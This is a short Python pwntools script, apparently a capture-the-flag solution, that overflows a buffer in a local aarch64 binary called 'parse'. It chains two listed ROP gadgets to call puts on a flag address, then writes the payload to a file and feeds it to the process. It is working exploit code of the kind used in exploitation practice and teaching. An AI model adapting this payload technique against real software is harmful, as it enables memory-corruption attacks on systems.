from pwn import *

proc = ELF("./parse")

context.arch = "aarch64"


# 0x0000000000400e7c : ldp x29, x30, [sp], #0x30 ; ret
# 0x0000000000401040 : ldr x0, [sp, #0x28] ; ldp x29, x30, [sp], #0x40 ; ret
# 0x4008c0 = puts
# 0x401b58 = flag

ldp = (0x0000000000400e7c)
ldr = (0x0000000000401040)
puts = (0x4008c0)
flag = (0x401b58)

x = (b"1:a" + b"\x1F" * 0x11 + p64(ldp) + b"\x42" * 0x20 + p64(ldr) + b"\x43" * 16 + p64(ldr) + b"A" * 40 + p64(puts) + b"B" * (46//2 + 1) + p64(flag) ) + b"\n"

open("data", "wb").write(x)

#r = gdb.debug([proc.path], gdbscript="c")

r = process([proc.path])

r.send(x)
r.stdin.close()

r.interactive()
